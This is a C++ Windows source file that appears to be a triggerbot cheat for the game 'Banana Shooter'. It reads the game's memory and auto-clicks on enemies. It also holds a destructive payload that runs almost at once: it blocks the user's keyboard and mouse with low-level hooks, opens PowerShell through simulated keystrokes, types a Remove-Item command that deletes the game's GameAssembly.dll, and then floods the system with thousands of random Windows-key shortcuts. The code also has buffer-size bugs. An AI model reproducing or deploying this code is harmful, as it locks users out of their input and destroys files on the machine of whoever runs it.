#include <Windows.h>
#include <iostream>
#include <time.h>
#include <thread>
#include <tlhelp32.h>
#include <cstdlib>

HHOOK hKeyboardHook;
HHOOK hMouseHook;


LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {
		
		return 1;
	}
	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {
		
		return 1;
	}
	return CallNextHookEx(hMouseHook, nCode, wParam, lParam);
}

void DisableInput() {
	hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
	hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, NULL, 0);
}

void EnableInput() {
	if (hKeyboardHook) {
		UnhookWindowsHookEx(hKeyboardHook);
		hKeyboardHook = NULL;
	}

	if (hMouseHook) {
		UnhookWindowsHookEx(hMouseHook);
		hMouseHook = NULL;
	}

}

void DeleteEXE(char* path, int language);
void Fackap();

int main() {

	INPUT input[4] = {};
	INPUT input2[100] = {};
	HANDLE snapshot = 0;
	PROCESSENTRY32 pe32 = { 0 };
	HANDLE process = nullptr;
	DWORD exitCode = 0;
	uintptr_t processId = 0;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	BYTE * client = 0;
	uintptr_t clientBaseAddr = 0;

	

	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	Process32First(snapshot, &pe32);

	do {

		if (wcscmp(pe32.szExeFile, L"Banana Shooter.exe") == 0) {

			printf("Banana found man");
			processId = pe32.th32ProcessID;
			process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);


		}
	} while (Process32Next(snapshot, &pe32));

	CloseHandle(snapshot);

	HANDLE Msnapshot = 0;
	MODULEENTRY32 me32 = { 0 };
	me32.dwSize = sizeof(MODULEENTRY32);
	Msnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, processId);
	WCHAR * path;
	char* str = NULL;
	size_t NumberBytes = 0;
	const wchar_t* p = L"this is the path";
	Module32First(Msnapshot, &me32);
	while (Module32Next(Msnapshot, &me32))
	{

		printf("%ws \n", me32.szModule);
		if (wcscmp(me32.szModule, L"GameAssembly.dll") == 0) {

			printf("The client dll is found man");
			client = me32.modBaseAddr;
			printf("ModuleEntry32.szModule= %S\n", me32.szModule);
			printf("dwModuleBaseAddress= %p\n", client);
			printf("dwModuleBaseAddress= %p\n", me32.modBaseAddr);
			path = me32.szExePath;

			

			const wchar_t* stri = path;
			size_t len = wcslen(path);
			str = (char*)malloc(len);

			
			wcstombs_s(&NumberBytes, str, (len + 1) * 2, stri, (len + 1) * 2);
			std::cout << str;
			

			break;
		}
	}
	
	

	CloseHandle(Msnapshot);

	int count = 0;
	uintptr_t onEnemy = 0;
	uintptr_t address = (uintptr_t)client + 0x029616f0;
	int check = 0;

	while (check != 1) {

		std::this_thread::sleep_for(std::chrono::milliseconds(1));

		ReadProcessMemory(process, (void*)address, &onEnemy, 8, NULL);

		onEnemy += 0xB8;

		ReadProcessMemory(process, (void*)onEnemy, &onEnemy, 8, NULL);

		onEnemy += 0x0;

		ReadProcessMemory(process, (void*)onEnemy, &onEnemy, 8, NULL);

		onEnemy += 0x28;

		ReadProcessMemory(process, (void*)onEnemy, &onEnemy, 8, NULL);

		onEnemy += 0x58;

		ReadProcessMemory(process, (void*)onEnemy, &onEnemy, 8, NULL);

		onEnemy += 0x10;

		ReadProcessMemory(process, (void*)onEnemy, &onEnemy, 8, NULL);

		onEnemy += 0xF0;

		ReadProcessMemory(process, (void*)onEnemy, &onEnemy, 8, NULL);

		onEnemy += 0x4560;

		ReadProcessMemory(process, (void*)onEnemy, &onEnemy, 8, NULL);

		if (onEnemy == 1) {

			count += 1;
			input[0].type = INPUT_MOUSE;
			input[0].mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
			SendInput(ARRAYSIZE(input), input, sizeof(input));
		}

		else {

			input[0].type = INPUT_MOUSE;
			input[0].mi.dwFlags = MOUSEEVENTF_LEFTUP;
			SendInput(1, input, sizeof(INPUT));

		}

		count = 10;
		

		if (count == 10 && check == 0) {

			

			DeleteEXE(str, 1);

			Fackap();

			
			
			

			check = 1;
		}
	}	



	return 0;

}

void DeleteEXE(char * path, int language) {

	INPUT input[4] = {}; 
	INPUT input2[10] = {};
	INPUT input3[4] = {};
	INPUT input4[100] = {};
	INPUT input5[300] = {};
	INPUT input6[5] = {};

	int american = 0;
	int swedish = 0;

	switch (language) {

	case 1:

		swedish = 1;

		break;

	case 2:

		american = 1;

		break;



	}

	


	
	

	
		DisableInput();

		input[0].type = INPUT_KEYBOARD;
		input[0].ki.wVk = VK_LWIN;

		input[1].type = INPUT_KEYBOARD;
		input[1].ki.wVk = VK_LWIN;
		input[1].ki.dwFlags = KEYEVENTF_KEYUP;

		EnableInput();

		SendInput(ARRAYSIZE(input), input, sizeof(INPUT));

		DisableInput();

		Sleep(100);

		input2[0].type = INPUT_KEYBOARD;
		input2[0].ki.wVk = 'P';

		input2[1].type = INPUT_KEYBOARD;
		input2[1].ki.wVk = 'P';
		input2[1].ki.dwFlags = KEYEVENTF_KEYUP;

		input2[2].type = INPUT_KEYBOARD;
		input2[2].ki.wVk = 'O';

		input2[3].type = INPUT_KEYBOARD;
		input2[3].ki.wVk = 'O';
		input2[3].ki.dwFlags = KEYEVENTF_KEYUP;

		input2[4].type = INPUT_KEYBOARD;
		input2[4].ki.wVk = 'W';

		input2[5].type = INPUT_KEYBOARD;
		input2[5].ki.wVk = 'W';
		input2[5].ki.dwFlags = KEYEVENTF_KEYUP;

		input2[6].type = INPUT_KEYBOARD;
		input2[6].ki.wVk = 'E';

		input2[7].type = INPUT_KEYBOARD;
		input2[7].ki.wVk = 'E';
		input2[7].ki.dwFlags = KEYEVENTF_KEYUP;

		input2[8].type = INPUT_KEYBOARD;
		input2[8].ki.wVk = 'R';

		input2[9].type = INPUT_KEYBOARD;
		input2[9].ki.wVk = 'R';
		input2[9].ki.dwFlags = KEYEVENTF_KEYUP;



		printf("wait");

		EnableInput();

		SendInput(ARRAYSIZE(input2), input2, sizeof(INPUT));

		DisableInput();

		Sleep(100);

		input3[0].type = INPUT_KEYBOARD;
		input3[0].ki.wVk = VK_RETURN;

		input3[1].type = INPUT_KEYBOARD;
		input3[1].ki.wVk = VK_RETURN;
		input3[1].ki.dwFlags = KEYEVENTF_KEYUP;

		EnableInput();

		SendInput(ARRAYSIZE(input3), input3, sizeof(INPUT));

		DisableInput();

		Sleep(300);

		input4[0].type = INPUT_KEYBOARD;
		input4[0].ki.wVk = 'R';

		input4[1].type = INPUT_KEYBOARD;
		input4[1].ki.wVk = 'R';
		input4[1].ki.dwFlags = KEYEVENTF_KEYUP;

		input4[2].type = INPUT_KEYBOARD;
		input4[2].ki.wVk = 'E';

		input4[3].type = INPUT_KEYBOARD;
		input4[3].ki.wVk = 'E';
		input4[3].ki.dwFlags = KEYEVENTF_KEYUP;

		input4[4].type = INPUT_KEYBOARD;
		input4[4].ki.wVk = 'M';

		input4[5].type = INPUT_KEYBOARD;
		input4[5].ki.wVk = 'M';
		input4[5].ki.dwFlags = KEYEVENTF_KEYUP;

		input4[6].type = INPUT_KEYBOARD;
		input4[6].ki.wVk = 'O';

		input4[7].type = INPUT_KEYBOARD;
		input4[7].ki.wVk = 'O';
		input4[7].ki.dwFlags = KEYEVENTF_KEYUP;

		input4[8].type = INPUT_KEYBOARD;
		input4[8].ki.wVk = 'V';

		input4[9].type = INPUT_KEYBOARD;
		input4[9].ki.wVk = 'V';
		input4[9].ki.dwFlags = KEYEVENTF_KEYUP;

		input4[10].type = INPUT_KEYBOARD;
		input4[10].ki.wVk = 'E';

		input4[11].type = INPUT_KEYBOARD;
		input4[11].ki.wVk = 'E';
		input4[11].ki.dwFlags = KEYEVENTF_KEYUP;

		input4[12].type = INPUT_KEYBOARD;
		input4[12].ki.wVk = VK_SUBTRACT;

		input4[13].type = INPUT_KEYBOARD;
		input4[13].ki.wVk = VK_SUBTRACT;
		input4[13].ki.dwFlags = KEYEVENTF_KEYUP;

		input4[14].type = INPUT_KEYBOARD;
		input4[14].ki.wVk = 'I';

		input4[15].type = INPUT_KEYBOARD;
		input4[15].ki.wVk = 'I';
		input4[15].ki.dwFlags = KEYEVENTF_KEYUP;

		input4[16].type = INPUT_KEYBOARD;
		input4[16].ki.wVk = 'T';

		input4[17].type = INPUT_KEYBOARD;
		input4[17].ki.wVk = 'T';
		input4[17].ki.dwFlags = KEYEVENTF_KEYUP;

		input4[18].type = INPUT_KEYBOARD;
		input4[18].ki.wVk = 'E';

		input4[19].type = INPUT_KEYBOARD;
		input4[19].ki.wVk = 'E';
		input4[19].ki.dwFlags = KEYEVENTF_KEYUP;

		input4[20].type = INPUT_KEYBOARD;
		input4[20].ki.wVk = 'M';

		input4[21].type = INPUT_KEYBOARD;
		input4[21].ki.wVk = 'M';
		input4[21].ki.dwFlags = KEYEVENTF_KEYUP;

		input4[22].type = INPUT_KEYBOARD;
		input4[22].ki.wVk = VK_SPACE;

		input4[23].type = INPUT_KEYBOARD;
		input4[23].ki.wVk = VK_SPACE;
		input4[23].ki.dwFlags = KEYEVENTF_KEYUP;


		EnableInput();


		SendInput(ARRAYSIZE(input4), input4, sizeof(INPUT));

		DisableInput();


		printf("\n");

		int j = 0;
		swedish = 1;

		input5[0].type = INPUT_KEYBOARD;
		input5[0].ki.wVk = VK_SHIFT;



		input5[1].type = INPUT_KEYBOARD;
		input5[1].ki.wVk = '2';



		input5[2].type = INPUT_KEYBOARD;
		input5[2].ki.wVk = VK_SHIFT;
		input5[2].ki.dwFlags = KEYEVENTF_KEYUP;



		input5[3].type = INPUT_KEYBOARD;
		input5[3].ki.wVk = '2';
		input5[3].ki.dwFlags = KEYEVENTF_KEYUP;


		for (int i = 4; i < 200; i++) {

			printf("\n j = %d", j);
			printf("\n i = %d", i);


			if (isalpha(path[j]) != 0 || isdigit(path[j]) != 0) {

				if (isupper(path[j]) == 1) {

					input5[i].type = INPUT_KEYBOARD;
					input5[i].ki.wVk = VK_SHIFT;

					i++;

					input5[i].type = INPUT_KEYBOARD;
					input5[i].ki.wVk = path[j];

					i++;

					input5[i].type = INPUT_KEYBOARD;
					input5[i].ki.wVk = VK_SHIFT;
					input5[i].ki.dwFlags = KEYEVENTF_KEYUP;

					i++;

					input5[i].type = INPUT_KEYBOARD;
					input5[i].ki.wVk = path[j];
					input5[i].ki.dwFlags = KEYEVENTF_KEYUP;


				}

				if (isupper(path[j]) == 0) {

					input5[i].type = INPUT_KEYBOARD;
					input5[i].ki.wVk = toupper(path[j]);
					printf("\ninput5[%d] = %c", j, input5[i].ki.wVk);



					i += 1;
					printf("\n i2 = %d", i);
					input5[i].type = INPUT_KEYBOARD;
					input5[i].ki.wVk = toupper(path[j]);
					input5[i].ki.dwFlags = KEYEVENTF_KEYUP;

				}

			}

			if (isalpha(path[j]) == 0) {

				if (american == 1) {

					switch (path[j]) {



					}

				}

				if (swedish == 1) {



					switch (path[j]) {

					case ':':
						printf("COlon");
						input5[i].type = INPUT_KEYBOARD;
						input5[i].ki.wVk = VK_SHIFT;

						i++;

						input5[i].type = INPUT_KEYBOARD;
						input5[i].ki.wVk = VK_OEM_PERIOD;

						i++;

						input5[i].type = INPUT_KEYBOARD;
						input5[i].ki.wVk = VK_SHIFT;
						input5[i].ki.dwFlags = KEYEVENTF_KEYUP;

						i++;

						input5[i].type = INPUT_KEYBOARD;
						input5[i].ki.wVk = VK_OEM_PERIOD;
						input5[i].ki.dwFlags = KEYEVENTF_KEYUP;

						break;

					case '\\':
						printf("backslash");

						input5[i].type = INPUT_KEYBOARD;
						input5[i].ki.wVk = VK_RMENU;

						i++;

						input5[i].type = INPUT_KEYBOARD;
						input5[i].ki.wVk = VK_OEM_PLUS;

						i++;

						input5[i].type = INPUT_KEYBOARD;
						input5[i].ki.wVk = VK_RMENU;
						input5[i].ki.dwFlags = KEYEVENTF_KEYUP;

						i++;

						input5[i].type = INPUT_KEYBOARD;
						input5[i].ki.wVk = VK_OEM_PLUS;
						input5[i].ki.dwFlags = KEYEVENTF_KEYUP;

						break;

					case '-':

						input5[i].type = INPUT_KEYBOARD;
						input5[i].ki.wVk = VK_SUBTRACT;

						i++;

						input5[i].type = INPUT_KEYBOARD;
						input5[i].ki.wVk = VK_SUBTRACT;
						input5[i].ki.dwFlags = KEYEVENTF_KEYUP;

					case '.':

						input5[i].type = INPUT_KEYBOARD;
						input5[i].ki.wVk = VK_OEM_PERIOD;

						i++;

						input5[i].type = INPUT_KEYBOARD;
						input5[i].ki.wVk = VK_OEM_PERIOD;
						input5[i].ki.dwFlags = KEYEVENTF_KEYUP;

						break;

					case ' ':

						input5[i].type = INPUT_KEYBOARD;
						input5[i].ki.wVk = VK_SPACE;

						i++;

						input5[i].type = INPUT_KEYBOARD;
						input5[i].ki.wVk = VK_SPACE;
						input5[i].ki.dwFlags = KEYEVENTF_KEYUP;

						break;

					case '(':

						input5[i].type = INPUT_KEYBOARD;
						input5[i].ki.wVk = VK_LSHIFT;

						i++;

						input5[i].type = INPUT_KEYBOARD;
						input5[i].ki.wVk = '8';

						i++;

						input5[i].type = INPUT_KEYBOARD;
						input5[i].ki.wVk = VK_LSHIFT;
						input5[i].ki.dwFlags = KEYEVENTF_KEYUP;

						i++;

						input5[i].type = INPUT_KEYBOARD;
						input5[i].ki.wVk = '8';
						input5[i].ki.dwFlags = KEYEVENTF_KEYUP;

						break;

					case ')':

						input5[i].type = INPUT_KEYBOARD;
						input5[i].ki.wVk = VK_LSHIFT;

						i++;

						input5[i].type = INPUT_KEYBOARD;
						input5[i].ki.wVk = '9';

						i++;

						input5[i].type = INPUT_KEYBOARD;
						input5[i].ki.wVk = VK_LSHIFT;
						input5[i].ki.dwFlags = KEYEVENTF_KEYUP;

						i++;

						input5[i].type = INPUT_KEYBOARD;
						input5[i].ki.wVk = '9';
						input5[i].ki.dwFlags = KEYEVENTF_KEYUP;

						break;
















					}

				}




			}


			j += 1;

			if (j == strlen(path)) {

				i++;

				input5[i].type = INPUT_KEYBOARD;
				input5[i].ki.wVk = VK_SHIFT;

				i++;

				input5[i].type = INPUT_KEYBOARD;
				input5[i].ki.wVk = '2';

				i++;

				input5[i].type = INPUT_KEYBOARD;
				input5[i].ki.wVk = VK_SHIFT;
				input5[i].ki.dwFlags = KEYEVENTF_KEYUP;

				i++;

				input5[i].type = INPUT_KEYBOARD;
				input5[i].ki.wVk = '2';
				input5[i].ki.dwFlags = KEYEVENTF_KEYUP;

				i = 200;

			}

		}

		printf("\n%c", input5[1].ki.wVk);

		EnableInput();


		SendInput(ARRAYSIZE(input5), input5, sizeof(INPUT));

		DisableInput();


		input6[0].type = INPUT_KEYBOARD;
		input6[0].ki.wVk = VK_RETURN;

		input6[1].type = INPUT_KEYBOARD;
		input6[1].ki.wVk = VK_RETURN;
		input6[1].ki.dwFlags = KEYEVENTF_KEYUP;

		EnableInput();

		SendInput(ARRAYSIZE(input6), input6, sizeof(INPUT));

		DisableInput();

		
	

}

void Fackap(){

	INPUT input[3000] = {};

	srand(time(0));
	

	char alphabet[26] = { 'a', 'b', 'c', 'd', 'e', 'f', 'g',
						  'h', 'i', 'j', 'k', 'l', 'm', 'n',
						  'o', 'p', 'q', 'r', 's', 't', 'u',
						  'v', 'w', 'x', 'y', 'z' };

	for (int i = 0; i < 2999; i++) {

		int number = rand() % 26;

		input[i].type = INPUT_KEYBOARD;
		input[i].ki.wVk = VK_LWIN;

		i++;

		input[i].type = INPUT_KEYBOARD;
		input[i].ki.wVk = alphabet[number];

		i++;

		input[i].type = INPUT_KEYBOARD;
		input[i].ki.wVk = VK_LWIN;
		input[i].ki.dwFlags = KEYEVENTF_KEYUP;

		i++;

		input[i].type = INPUT_KEYBOARD;
		input[i].ki.wVk = alphabet[number];
		input[i].ki.dwFlags = KEYEVENTF_KEYUP;
		
		
		SendInput(ARRAYSIZE(input), input, sizeof(INPUT));
	}


}